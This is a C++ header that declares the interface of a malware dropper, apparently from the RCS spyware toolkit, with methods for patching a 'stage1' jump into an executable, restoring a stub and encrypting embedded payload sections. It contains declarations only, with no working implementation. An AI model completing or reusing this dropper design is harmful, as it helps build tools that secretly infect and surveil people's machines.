/*
 * RCSDropper.h
 *
 *  Created on: May 11, 2010
 *      Author: daniele
 */

#ifndef RCSDROPPER_H_
#define RCSDROPPER_H_

#include <vector>
#include <boost/filesystem.hpp>
namespace bf = boost::filesystem;

#include "DropperHeader.h"

class Dropper
{
public:
	virtual std::size_t restoreStub( DWORD currentVA ) = 0;
	virtual void patchStage1(char* ptr, DWORD VA, DWORD jumpToVA) = 0;

	virtual const char* data() = 0;
	virtual std::size_t size() = 0;
};

class RCSDropper : public Dropper
{
public:
	RCSDropper(const char* filepath);
	virtual ~RCSDropper();

	std::size_t restoreStub( DWORD currentVA );
	void patchStage1(char* ptr, DWORD VA, DWORD jumpToVA);

	const char* data() { return &data_[0]; }
	std::size_t size() { return data_.size(); }

private:
	void loadFile(bf::path filename);
	bool verifyCookerVersion();
	void generateKey();
	void encrypt();
	void encryptFile_(DataSectionCryptoPack& file);

	DropperHeader* header() { return (DropperHeader*) ptr_(offset_.header); }

	unsigned char* ptr_(std::size_t offset) { return (unsigned char*)(&data_[0] + offset); }

	struct {
		std::size_t restore;
		std::size_t header;
		std::size_t stage1;
	} offset_;

	std::size_t size_;

	std::vector<char> data_;
};

class DummyDropper : public Dropper
{
public:
	DummyDropper() {}
	virtual ~DummyDropper() {}

	std::size_t restoreStub( DWORD currentVA ) { (void) currentVA; return 0; }
	void patchStage1(char* ptr, DWORD VA, DWORD jumpToVA) { (void) ptr; (void) VA; (void) jumpToVA; return; }

	const char* data() { return NULL; }
	std::size_t size() { return 0; }
};

class InvalidCookerVersion : public std::runtime_error
{
public:
	InvalidCookerVersion(std::string effective, std::string required, std::string msg = "Cooked file built with an incompatbile RCSCooker version.")
	: std::runtime_error(msg), effective_(effective), required_(required) {}

	~InvalidCookerVersion() throw() {};

	std::string required() { return required_; }
	std::string effective() { return effective_; }

private:
	std::string effective_;
	std::string required_;
};

#endif /* RCSDROPPER_H_ */
